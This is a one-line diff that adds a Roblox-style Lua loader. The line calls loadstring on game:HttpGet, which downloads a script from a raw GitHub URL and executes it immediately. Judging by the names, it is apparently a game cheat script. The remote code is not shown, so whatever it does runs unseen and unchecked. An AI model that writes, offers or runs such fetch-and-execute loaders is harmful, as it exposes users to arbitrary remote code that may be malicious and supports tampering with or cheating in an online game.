@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/lemonsqe/ttdscr/main/gulv2'))()
